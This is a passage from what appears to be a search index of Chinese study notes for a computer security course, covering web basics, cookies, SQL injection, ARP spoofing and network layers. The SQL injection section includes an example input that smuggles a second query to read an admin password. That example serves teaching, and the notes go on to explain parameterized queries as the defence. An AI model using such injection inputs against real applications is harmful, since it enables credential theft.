<p>\u4f8b\u5982\uff0c\u5373\u4f7fEve\u89c2\u5bdf\u4e86\u4f17\u591a\u7ec4\u5bc6\u6587+MAC\u7684\u7ec4\u5408\uff0c\u5979\u4e5f\u65e0\u6cd5\u521b\u9020\u51fa\u4e00\u7ec4\u65b0\u7684\u6709\u6548\u7684\u6587\u672c+MAC\u7ec4\u5408</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#web-security","title":"Web security","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#sql-injection","title":"SQL injection","text":"<p>\u5f88\u591a\u79cd\u5b89\u5168\u653b\u51fb\u53d1\u751f\u5728\u4e8e\u5bf9\u4e8e\u8f93\u5165\u7684\u68c0\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u7279\u6b8a\u7684\u8f93\u5165\u4f1a\u53d1\u751f\u8bbe\u8ba1\u8005\u610f\u6599\u4e4b\u5916\u7684\u4e8b\u3002\u5728\u5f53\u4eca\u4e92\u8054\u7f51\u4e0aweb\u5e94\u7528\u591a\u6570\u662f\u4f9d\u8d56\u4e8e\u6570\u636e\u5e93\uff0c\u56e0\u6b64\u591a\u6570\u60c5\u51b5\u4e0b\u662fSQL injection\u653b\u51fb</p> <p>\u73b0\u4ee3web\u5e94\u7528\u6709\u4e00\u4e9b\u7279\u5f81</p> <ul> <li>\u7528SQL\u6570\u636e\u5e93\u5b58\u50a8\u4fe1\u606f</li> <li>\u7528HTTP\u8bf7\u6c42\u548c\u6570\u636e\u5e93\u4ea4\u4e92</li> </ul> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f8b\u5982\u6709\u4e00\u4e2aweb\u5e94\u7528</p> <pre><code>\u5bf9\u4e8e\u8fd9\u6837\u7684http\u8bf7\u6c42 http://www.berkeley.edu/evals?course=cs61a\n\u4ea7\u751f\u8fd9\u6837\u7684\u67e5\u8be2sql SELECT rating FROM evals WHERE course = 'cs61a'\n</code></pre> <p>\u5bf9\u6b64\u6211\u4eec\u4f7f\u7528\u8fd9\u6837\u7684\u8f93\u5165<code>garbage'; SELECT password FROM passwords WHERE username = 'admin</code>\u200b</p> <p>\u5c31\u53ef\u4ee5\u6267\u884c\u8fd9\u6837\u7684sql\u8bed\u53e5</p> <pre><code>SELECT rating FROM evals WHERE course = 'garbage'; SELECT * FROM passwords WHERE username = 'admin'\n</code></pre> <p>\u5f53\u7136\u4e0a\u8ff0\u60c5\u51b5\u662f\u6bd4\u8f83\u7406\u60f3\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u9632\u5fa1\u7684\u60c5\u5f62\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u4f1a\u628aSQL\u8bed\u53e5\u53c2\u6570\u5316\u6765\u9632\u6b62SQL injection</p> <p>SQL\u53c2\u6570\u5316\u662f\u6307\u5148\u5bf9SQL\u8bed\u53e5\u8fdb\u884c\u67e5\u8be2\u7f16\u8bd1\u548c\u89e3\u91ca\uff0c\u5728\u63d2\u5165\u7528\u6237\u8f93\u5165\u7684\u53c2\u6570\uff0c\u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8f93\u5165\u7edd\u4e0d\u4f1a\u88ab\u4f5c\u4e3aSQL\u8bed\u53e5\u6267\u884c\uff0c\u800c\u4ec5\u4ec5\u662f\u53c2\u6570\u7684\u4e00\u90e8\u5206</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#introduction-to-the-web","title":"Introduction to the Web","text":"<p>\u7f51\u7edc\u4e0a\u7684\u6240\u6709\u8d44\u6e90\uff08\u7f51\u7edc\u5305\uff0cimage\uff0cPDF\u7b49\u7b49\uff09\uff0c\u90fd\u88abURL\u6240\u5b9a\u4f4d\u3002URL\u662f\u6307 Uniform Rescource Locator\u3002\u65e8\u5728\u51c6\u786e\u63cf\u8ff0\u5728Internet\u4e0a\u67e5\u627e\u4fe1\u606f\u7684\u4f4d\u7f6e</p> <pre><code>http://www.example.com/index.html\n</code></pre> <p>\u4e00\u4e2aURL\u53ef\u4ee5\u88ab\u5206\u4e3a\u4e09\u4e2a\u57fa\u672c\u90e8\u5206</p> <ul> <li>protocol \u534f\u8bae\u4e5f\u5c31\u662f\u4e0a\u8ff0\u4f8b\u5b50\u91cc\u7684http\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u5982\u4f55\u68c0\u7d22\u8d44\u6e90\uff0c\u4e00\u822c\u5c31\u662fhttp\u548chttps\uff08http\u7684TLS\u52a0\u5bc6\u7248\u672c\uff09\u8fd8\u6709ssh\u548cftp\u7b49</li> <li>location/domain \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\u5c31\u662f<code>www.example.com</code>\u200b\u544a\u8bc9\u6211\u4eec\u53bb\u627e\u54ea\u4e2aWeb\u670d\u52a1\u5668\uff0c\u5bf9\u4e8elocation\u6211\u4eec\u8fd8\u53ef\u4ee5\u5236\u5b9a\uff08\u7528@\uff09username\u548c\uff08\u7528\uff1a\uff09port</li> <li>path \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\u5c31\u662f<code>index.html</code>\u200b\uff0cWeb\u670d\u52a1\u5668\u901a\u8fc7\u8fd9\u90e8\u5206\u6765\u786e\u5b9a\u54ea\u4e9b\u8d44\u6e90\uff08\u6bd4\u5982\u9875\u9762\uff09\u8fd4\u56de\u7ed9\u4f60\uff0c\u5c31\u662f\u60f3\u8c61\u6211\u4eec\u5728\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7cfb\u7edf</li> </ul> <p>\u5728path\u90e8\u5206\uff0c\u540e\u9762\u53ef\u4ee5\u52a0\u4e00\u4e2a\u2018?\u2019\u7136\u540e\u540e\u9762\u52a0\u4e0a\u4e00\u7ec4\u53ef\u9009\u7684\u53c2\u6570\uff0c\u7528\u6765\u7ed9Web\u670d\u52a1\u5668\u53d1\u9001\u4fe1\u606f\u3002</p> <p>\u5728\u6700\u540e\uff0c\u53ef\u4ee5\u52a0\u4e0a\u4e00\u4e2a\u2018#\u2019\u540e\u9762\u52a0\u4e0a\u4e00\u7ec4\u6587\u672c\uff0c\u5176\u4e0d\u4f1a\u88ab\u53d1\u5230\u670d\u52a1\u5668\uff0c\u7528\u4e8e\u5f71\u54cd\u4e8e\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u4e0a\u7684\u7f51\u9875\uff0c\u5176\u57fa\u672c\u4e0a\u5c31\u662f\u6211\u4eec\u5728html\u4e2d\u4f7f\u7528\u7684\u951a\u70b9\uff0c\u5b9a\u4f4d\u5230\u67d0\u4e2a\u7f51\u9875\u4e2d\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u4e00\u4e2a\u6bd4\u8f83\u5b8c\u6574\u7684URL\u5982\u4e0b</p> <pre><code>http://evanbot@www.cs161.org:161/whoami?k1=v1&amp;k2=v2#anchor\n</code></pre> <p>Introduction to http</p> <p>http\u662f\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u901a\u4fe1\u4ee5\u83b7\u53d6\u8d44\u6e90\u53d1\u51fa\u8bf7\u6c42\u7684\u8bed\u8a00</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#same-origin-policy","title":"Same-Origin Policy","text":"<p>\u5bf9\u4e8e\u6d4f\u89c8\u5668\u8bbf\u95ee\u7684\u7f51\u9875\u8fdb\u884c\u9694\u79bb\uff0c\u6211\u4eec\u4e0d\u4f1a\u5e0c\u671b\u4e00\u4e2a\u7f51\u9875\u6709\u5f71\u54cd\u53e6\u4e00\u4e2a\u7f51\u9875\u7684\u80fd\u529b\u3002</p> <p>\u6240\u8c13\u7684origin\u662f\u6307webpage\u4e2d\u7684protocol+domain name+port(domain name\u4e2d\u6709\u6ca1\u6709www\u6709\u533a\u522b)</p> <p>\u5982\u679cport\u6ca1\u6709\u5177\u4f53\u7684\u8bf4\u660e\uff0c\u9ed8\u8ba4\u662f80\u5bf9\u4e8ehttp\uff0c443\u5bf9\u4e8ehttps</p> <p>\u867d\u7136\u4e00\u822c\u7684\u8d44\u6e90\u90fd\u662f\u7531URL\u5b9a\u4e49\u7684\uff0c\u4f46\u662f\u5b58\u5728\u4e00\u4e9b\u4f8b\u5916\u7684\u60c5\u51b5</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#cookies-and-session-management","title":"Cookies and Session Management","text":"<p>Http\u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u7684\u534f\u8bae\uff0c\u4e5f\u5c31\u662f\u6bcf\u4e2aresponse\u548crequest\u4e4b\u95f4\u76f8\u4e92\u4e4b\u95f4\u662f\u72ec\u7acb\u7684\u3002\u4f46\u662f\u6211\u4eec\u4f1a\u5e0c\u671b\u5176\u5b58\u50a8\u67d0\u79cd\u72b6\u6001\uff0c\u6bd4\u5982\u767b\u5f55\u7684\u72b6\u6001\uff0c\u7f51\u7ad9\u7684\u6df1\u8272\u6a21\u5f0f\u7b49\u7b49\uff0c\u5b9e\u9645\u4e0a\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u901a\u8fc7\u5b58\u50a8Cookies\u6765\u652f\u6301\u8fd9\u4e9b\u529f\u80fd\u3002</p> <p>\u5f53\u6211\u4eec\u505a\u51fa\u67d0\u79cd\u8bbe\u7f6e\u7684\u65f6\u5019\uff0c\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u53d1\u9001\u4e00\u4e2aSet-Cookie header\uff0c\u4f7f\u5f97\u672c\u5730\u7684\u673a\u5668\u5b58\u50a8\u7740\u8fd9\u4e2aCookies\uff0c\u4e4b\u540e\u7684\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u628a\u5b58\u50a8\u7684Cookies\u9644\u52a0\u5230\u8bf7\u6c42\u4e0a\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5c31\u77e5\u9053\u5982\u4f55\u6b63\u786e\u53d1\u9001\u8d44\u6e90\u4e86\u3002</p> <p>Cookie Attributes</p> <p>\u6bcf\u4e00\u4e2acookie\u90fd\u662f\u4e00\u4e2aname-value pair\uff0c\u5c31\u50cf\u4e00\u4e2aJSON\u90a3\u6837\u3002\u8fd9\u662fcookie\u672c\u8eab\u7684\u6838\u5fc3\u529f\u80fd\uff0c\u4f46\u662fcookie\u8fd8\u9700\u8981\u4e00\u4e9b\u5c5e\u6027\uff0c\u6765\u786e\u5b9a\u5b83\u5230\u5e95\u662f\u4ece\u54ea\u4e2a\u670d\u52a1\u5668\u6765\u7684\uff0c\u9700\u8981\u52a0\u88c5\u5728\u7ed9\u54ea\u4e9b\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u4e2d\u3002</p> <ul> <li>Domain and Path \u544a\u8bc9\u6d4f\u89c8\u5668\u5c06cookie\u53d1\u9001\u5230\u54ea\u4e9bURL</li> <li>Secure \u5c5e\u6027\u544a\u8bc9\u6d4f\u89c8\u5668\u9700\u8981\u7528\u5b89\u5168\u7684https\u53d1\u9001</li> <li>HttpOnly \u653e\u7f6eJavaScript\u8bbf\u95ee\u548c\u4fee\u6539Cookie</li> <li>expires field \u544a\u8bc9\u6d4f\u89c8\u5668\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5fd8\u6389\u7740Cookie</li> </ul> <p>\u4f8b\u5982\u4e00\u4e2aDomain\u4e3a<code>example.com</code>\u200b, Path\u4e3a<code>/some/path</code>\u200b\u7684Cookie\uff0c\u4f1a\u88ab\u653e\u7f6e\u4e8e\uff0c<code>http://foo.example.com/some/path/index.html</code>\u200b\u8fd9\u6837\u7684\u8bf7\u6c42\u4e2d\uff0c\u8be5\u8bf7\u6c42\u62c6\u5206\u4e00\u4e0b\u5176\u5b9e\u662f\uff0cURL\u7684domain\u4ee5Cookie\u7684\u7ed3\u5c3e\uff1bURL\u7684path\u4ee5Cookie\u7684\u5f00\u5934</p> <ul> <li>foo.example.com: URL's domain</li> <li>example.com: cookie's domain</li> <li>index.html: cookie's path</li> <li>some/path/index.html: URL's path</li> </ul> <p>setting domain and path</p> <p>\u901a\u8fc7\u4e0a\u8ff0\u903b\u8f91\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa\u5982\u679c\u670d\u52a1\u5668\u9700\u8981\u8bbe\u7f6ecookie\u7684domain\uff0c\u5176\u5fc5\u987b\u6839\u636e\u81ea\u8eab\u7684URL\u6765\u8bbe\u7f6e\uff0c\u800c\u4e0d\u80fd\u4efb\u610f\u8bbe\u7f6e\uff0c\u5426\u5219\u6076\u610f\u670d\u52a1\u5668\u5f88\u5bb9\u6613\u53ef\u4ee5\u8ba9\u6211\u4eec\u672c\u5730\u7684\u673a\u5668\u7ed9\u6b63\u5e38\u7f51\u7ad9\u53d1\u9001\u8bbe\u5b9a\u7684cookie\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ea\u80fd\u4f7f\u7528URL\u7684domain\u7684\u5168\u90e8\u6216\u8005\u540e\u534a\u90e8\u5206\uff0c\u4f46\u662f\u6709\u4e2a\u95ee\u9898\u662f\u4f8b\u5982<code>www.baidu.com</code>\u200b\u7684domain\uff0c\u6211\u4eec\u4e0d\u53ef\u4ee5\u4f7f\u7528<code>com</code>\u200b\u4f5c\u4e3aCookies\u7684domain\uff0c\u5426\u5219\u4e0a\u8ff0\u4fdd\u62a4\u5c31\u6beb\u65e0\u610f\u4e49\u4e86\uff0c\u50cfedu, com, cn\u7b49\u88ab\u6d4f\u89c8\u5668\u8bb0\u5f55\u4e3atop-level domain\uff08\u9876\u7ea7\u57df\u540d\uff09\u662f\u4e0d\u53ef\u4ee5\u5355\u72ec\u4f5c\u4e3aCookies\u7684domain</p> <p>\u8bbe\u7f6epath\u662f\u65e0\u9650\u5236\u7684</p> <p>Session Management</p> <p>session token cookie</p> <p>\u4f1a\u8bdd\u4ee4\u724c\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578bcookie\uff0c\u7528\u4e8e\u7ef4\u62a4\u767b\u5f55\u72b6\u6001\uff0c\u5176\u901a\u8fc7Cookie\u53d1\u9001</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#network-security","title":"Network security","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#network-intro","title":"network intro","text":"<p>Local Area Network</p> <p>\u4e92\u8054\u7f51\u7684\u4e3b\u8981\u76ee\u6807\u662f\u5c06\u6570\u636e\u4ece\u4e00\u4e2a\u5730\u65b9\u79fb\u52a8\u5230\u53e6\u4e00\u4e2a\u5730\u65b9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4e00\u4e9b\u53ef\u4ee5\u8ba9\u6211\u4eec\u8de8\u7a7a\u95f4\u4f20\u8f93\u4fe1\u606f\u7684\u4e1c\u897f\uff0c\u6bd4\u5982\u7535\u7ebf\uff0c\u65e0\u7ebf\u7535\u6ce2\u7b49\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8003\u8651\u5c40\u57df\u7f51\uff08LAN \u4e5f\u5373local area network\uff09\uff0c\u5728LAN\u4e2d\uff0c\u6240\u6709\u7684\u673a\u5668\u90fd\u94fe\u63a5\u5230\u5176\u4ed6\u6240\u6709\u673a\u5668\uff0c\u53ef\u4ee5\u6a21\u62df\u6210\u4e0b\u56fe\u6240\u793a</p> <p>\u200b\u200b</p> <p>\u4f46\u662f\u5982\u679c\u8981\u628a\u4e16\u754c\u4e0a\u6240\u6709\u673a\u5668\u90fd\u76f8\u8fde\uff0c\u663e\u7136\u662f\u4e0d\u592a\u73b0\u5b9e\u7684\uff0c\u56e0\u6b64\u5728LAN\u548cLAN\u4e4b\u95f4\uff0c\u6211\u4eec\u4f7f\u7528\u8def\u7531\u5668\uff08router\uff09\uff0c\u4e00\u4e2arouter\u53ef\u4ee5\u8fde\u63a5\u4e24\u4e2a\u6216\u8005\u591a\u4e2aLAN\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u5411\u53e6\u4e00\u4e2aLAN\u4e2d\u7684\u673a\u5668\u53d1\u9001\u6d88\u606f\uff0c\u9700\u8981\u5148\u53d1\u9001\u5230router\uff0c\u7531router\u53d1\u9001\u5230LAN</p> <p>\u8db3\u591f\u591a\u7684LAN+router\uff0c\u6784\u5efa\u51fa\u4e86wide area network\uff08\u5e7f\u57df\u7f51\uff09\uff0c\u6784\u5efa\u4e86\u4e92\u8054\u7f51\u7684\u57fa\u7840</p> <p>Internet layering</p> <p>\u4e0a\u8ff0\u8bbe\u8ba1\u5141\u8bb8\u6211\u4eec\u4f7f\u7528\u62bd\u8c61\u5c42\u6765\u6784\u5efaInternet</p> <ul> <li>\u6700\u5e95\u5c42\u662f\u7269\u7406\u5c42\uff0c\u4e5f\u5373\u8de8\u7a7a\u95f4\u4f20\u8f93\u4fe1\u606f</li> <li>\u7b2c\u4e8c\u5c42\u662f\u94fe\u8def\u5c42\uff0c\u901a\u8fc7\u7b2c\u4e00\u5c42\u6765\u8fde\u63a5LAN\u4e2d\u672c\u5730\u673a\u5668</li> <li>\u7b2c\u4e09\u5c42\u662fnetwork\u5c42\uff0c\u7531LAN\u6784\u6210</li> </ul> <p>\u8fd9\u79cd\u62bd\u8c61\u5c42\u7684\u9694\u79bb\uff0c\u4f7f\u5f97\u5c42\u4e0e\u5c42\u4e4b\u95f4\u7684\u5b9e\u73b0\u65b9\u5f0f\u4e92\u4e0d\u5f71\u54cd</p> <p>Protocols and Headers</p> <p>\u6bcf\u4e00\u5c42\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u7ec4\u534f\u8bae\uff0c\u534f\u8bae\u5305\u62ec\u4e86</p> <ul> <li>\u901a\u4fe1\u7684\u7ed3\u6784</li> <li>\u673a\u5668\u5728\u901a\u4fe1\u65f6\u7684\u8868\u73b0\uff0c\u4f8b\u5982\u53d1\u9001\u548c\u63a5\u53d7\u7684\u6d41\u7a0b</li> <li>\u5982\u4f55\u5904\u7406\u9519\u8bef\uff0c\u6bd4\u5982\u4fe1\u606f\u8d85\u65f6</li> </ul> <p>\u4e3a\u4e86\u652f\u6301\u534f\u8bae\uff0c\u6bcf\u4e2amessage\u53d1\u9001\u7684\u65f6\u5019\u90fd\u4f1a\u643a\u5e26\u4e00\u4e9bheaders\uff0c\u5185\u90e8\u4e00\u822c\u4f1a\u6709\u4e00\u4e9bmetadata\uff0c\u5305\u62ec\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u8eab\u4efd\uff0c\u8bc6\u522b\u53f7\u7b49\u7b49\uff0c\u6bcf\u4e2a\u6d88\u606f\u90fd\u4f1a\u4ece\u9ad8\u5c42\u5f00\u59cb\u52a0header\uff0c\u4f1a\u62e5\u6709\u591a\u4e2aheaders\u3002</p> <p>\u200b\u200b</p> <p>\u63a5\u53d7\u8005\u83b7\u5f97\u6d88\u606f\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u4ece\u6700\u5e95\u5c42\u6765\u5b9e\u89e3\u7801\uff0c\u83b7\u53d6\u5230\u5b9e\u9645\u4fe1\u606f</p> <p>Addressing: MAC, IP, Ports</p> <p>\u6211\u4eec\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u4fe1\u606f\uff0c\u6765\u6307\u5411\u4e00\u53f0\u76ee\u6807\u673a\u5668</p> <ul> <li>link layer, \u4f7f\u752848-bit\u7684MAC address\uff0c \u6765\u552f\u4e00\u786e\u5b9a\u8be5LAN\u91cc\u7684\u4e00\u53f0\u673a\u5668\uff0c\u4e00\u822c\u4f1a\u5199\u6210\u516d\u5bf916\u8fdb\u5236\u7684\u6570\u5b57\uff0c\u4f8b\u5982<code>ca:fe:f0:0d:be:ef</code>\u200b\uff0c\u4f46\u4fdd\u7559\u4e86\u4e00\u7ec4\u7279\u6b8a\u6570\u636e<code>ff:ff:ff:ff:ff:ff</code>\u200b\uff0c\u610f\u601d\u662f\u5411\u8fd9\u4e2aMAC\u91cc\u7684\u6240\u6709\u673a\u5668\u90fd\u53d1\u9001\u4fe1\u606f</li> <li>IP layer, \u901a\u8fc732-bit\u7684IP address\u6765\u5b9a\u4f4d\u5168\u7403\u8303\u56f4\u7684\u67d0\u4e00\u53f0\u673a\u5668\uff08\u4e3b\u673a\u6216\u8005\u8def\u7531\u5668\uff09\uff0c\u4f8b\u5982<code>128.32.131.10</code>\u200b\uff0c\u8fd9\u662f\u5c5e\u4e8eIPv4\u7684\u60c5\u5f62\uff0c\u4f46\u662f\u968f\u7740\u4e92\u8054\u7f51\u7684\u8fc5\u901f\u53d1\u5c55\uff0c\u5df2\u7ecf\u5df2\u7ecf\u5f00\u59cb\u8f6c\u5411IPv6\u4e86\uff0c\u4f7f\u7528128-bit\u6765\u5b9a\u4f4d</li> <li>\u5728\u66f4\u9ad8\u5c42\u7684\u8bbe\u8ba1\u4e2d\uff0c\u5141\u8bb8\u6bcf\u4e2a\u673a\u5668\u6709\u591a\u4e2a\u8fdb\u7a0b\u901a\u8fc7\u7f51\u7edc\u901a\u4fe1\uff0c\u66f4\u9ad8\u5c42\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u4e86\u552f\u4e00\u768416\u4f4d\u7aef\u53e3\uff0c\u4e5f\u5373port</li> </ul> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#arp","title":"ARP","text":"<p>Ethernet \u4ee5\u592a\u7f51\u662fLAN\u7684\u4e00\u79cd\u5177\u4f53\u5b9e\u73b0\uff0c\u5c06\u673a\u5668\u4ee5wires\u76f8\u8fde\uff0c\u5176\u8d77\u521d\u672c\u8eab\u662f\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u6a21\u578b\uff0c\u5c06\u6570\u636e\u5305\u53d1\u9001\u7ed9\u6240\u6709\u673a\u5668\uff0c\u6bcf\u4e2a\u673a\u5668\u81ea\u52a8\u5ffd\u7565\u975e\u81ea\u8eabMAC\u5730\u5740\u7684\u4fe1\u606f\uff0c\u4f46\u662f\u8fd9\u4ec5\u5728\u8f6f\u4ef6\u4e0a\u5f3a\u5236\u6267\u884c\uff0c\u5f88\u591a\u4ee5\u592a\u7f51\u53ef\u4ee5\u8fdb\u53bb\u6df7\u6742\u6a21\u5f0f\uff0c\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\u5176\u5c06\u63a5\u53d7\u6240\u6709\u6570\u636e\u5305\uff0c\u4e5f\u79f0\u4e3a sniffing packets</p> <p>\u8fd9\u4e2a\u9636\u6bb5\u7684\u534f\u8bae\u662fARP\uff0c\u4e5f\u5373address resolution protocol, \u5c06\u7b2c\u4e09\u5c42\u7684IP address \u8f6c\u6362\u6210\u7b2c\u4e8c\u5c42\u7684MAC addresses</p> <ul> <li>Alice \u5148\u8fdb\u884c\u5e7f\u64ad \u8c01\u7684IP\u5730\u5740\u662f 1.1.1.1</li> <li>Bob \u5982\u679c\u5728LAN\u4e2d\uff0c\u5c31\u76f4\u63a5\u56de\u590d\u81ea\u5df1\u7684MAC\u5730\u5740\uff0c\u5982\u679c\u4e0d\u5728LAN\u4e2d\uff0c\u5c31\u7531\u8be5IP\u5b9a\u4e49\u7684\u8def\u7531\u5668\u56de\u590dMAC\u5730\u5740</li> <li>Alice\u4f1a\u7528cache \u5b58\u50a8IP\u5730\u5740\u548cMAC\u5730\u5740\u7684\u6620\u5c04</li> </ul> <p>ARP spoofing</p> <p>\u56e0\u4e3a\u5728\u7b2c\u4e8c\u6b65\u6ca1\u6709\u68c0\u67e5\uff0c\u5982\u679cMallory\u521b\u5efa\u4e00\u4e2a\u865a\u5047\u56de\u590d\u7ed9Alice\uff0c\u90a3\u4e48Alice\u4f1a\u6709\u4e00\u4e2a\u865a\u5047\u7684IP-MAC\u7f13\u5b58\uff0c\u8981\u7ed9Bob\u53d1\u9001\u4fe1\u606f\u7684\u65f6\u5019\u5c31\u4f1a\u53d1\u9001\u7ed9Mallory</p> <p>\u6b64\u79cd\u653b\u51fb\u662f\u4e00\u79cdrace condition\uff0c\u5176\u672c\u8eab\u4e0d\u4f1a\u5f71\u54cd\u6b63\u786e\u7684\u54cd\u5e94\uff0c\u56e0\u6b64\u5176\u672c\u8eab\u5fc5\u987b\u6bd4\u5408\u6cd5\u54cd\u5e94\u66f4\u5feb\u3002</p> <p>\u9488\u5bf9\u6b64\u79cd\u653b\u51fb\uff0c\u5b58\u5728\u4e00\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u8ddf\u8e2aIP-MAC\u5730\u5740</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#wpa","title":"WPA","text":"<p>WiFi</p> <p>\u5bf9\u4e8e\u94fe\u8def\u5c42\u800c\u8a00\uff0c\u9664\u4e86\u4ee5\u592a\u7f51\u4ee5\u5916\u8fd8\u6709\u4e00\u4e2a\u5b9e\u73b0\uff0c\u5c31\u662f\u65e0\u7ebfWiFi\uff0c\u867d\u7136\u5b9e\u73b0\u7ec6\u8282\u4e0d\u540c\uff0c\u4f46\u662f\u884c\u4e3a\u7c7b\u4f3c\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#bgp","title":"BGP","text":"<p>\u5c5e\u4e8eIP\u5c42\u7684\u534f\u8bae</p> <p>Subnet</p> <p>IP\u8def\u7531\u4f9d\u8d56\u7684\u662f\u5b50\u7f51\u800c\u4e0d\u662f\u5355\u4e2aIP\uff0c\u6bd4\u5982<code>128.32/16</code>\u200b\u662f\u4e00\u4e2aIPv4 \u5b50\u7f51\uff0c\u6240\u6709\u5730\u5740\u4ee5<code>128.32</code>\u200b\u4e3a\u524d\u7f00\u7684\u5730\u5740\u90fd\u5c5e\u4e8e\u8fd9\u4e2a\u5b50\u7f51</p> <p>\u4f46\u662f\u8fd8\u5b58\u5728\u4e00\u4e9b\u4fdd\u7559\u7684IP\u5730\u5740\uff0c\u6709\u7279\u6b8a\u542b\u4e49</p> <ul> <li>\u5982\u679c\u8981\u53d1\u9001\u7ed9\u540c\u4e00\u4e2a\u672c\u5730\u7f51\u7edc\u7684\u673a\u5668\uff0c\u5c31\u5148\u68c0\u67e5IP\u662f\u5426\u5728\u540c\u4e00\u5b50\u7f51\uff0c\u82e5\u5728\u5c31\u7528ARP\u8f6c\u6362IP\u5730\u5740\uff0c\u53d1\u9001\u5230\u8be5MAC\u5730\u5740</li> <li> <p>\u5982\u679c\u662f\u53d1\u9001\u5230\u975e\u672c\u5730\u7f51\u7edc\u673a\u5668\uff0c\u9700\u8981\u628a\u6570\u636e\u5305\u53d1\u7ed9\u7f51\u5173\uff0c\u7531\u7f51\u5173\u5904\u7406\u8be5\u95ee\u9898</p> </li> <li> <p>\u7f51\u5173\u4f1a\u628a\u6570\u636e\u5305\u4f20\u8f93\u5230general Internet, \u5176\u6709\u5f88\u591aAS\u7ec4\u6210\uff0c\u6bcf\u4e2aAS\u90fd\u7531ASN\u552f\u4e00\u6807\u8bb0</p> </li> </ul> <p>BGP</p> <p>AS\u4e4b\u95f4\u7684\u8def\u7531\u7531BGP\u51b3\u5b9a\uff0cAS\u5411\u76f8\u90bb\u7684AS\u901a\u544a\u5176\u8d1f\u8d23\u7684\u7f51\u7edc\uff0c\u4ee5\u81f3\u4e8e\u6700\u7ec8\u5f62\u6210\u4e00\u5f20\u56fe\uff0c\u4f20\u8f93\u7684\u4fe1\u606f\u8db3\u591f\u6ee1\u8db3\u5728\u8fd9\u4e2a\u56fe\u5185\u90e8\u901a\u4fe1</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#tcp-udp","title":"TCP UDP","text":"<p>IP\u534f\u8bae\u4e0d\u4fdd\u8bc1\u6570\u636e\u5305\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u4e14IP\u552f\u4e00\u6807\u8bc6\u4e00\u53f0\u673a\u5668\uff0c\u4f46\u662f\u5e76\u4e0d\u533a\u5206\u673a\u5668\u4e0a\u7684\u8fdb\u7a0b</p> <p>\u800c\u4f20\u8f93\u5c42\u5f15\u5165\u4e86\u7aef\u53e3\u53f7 port 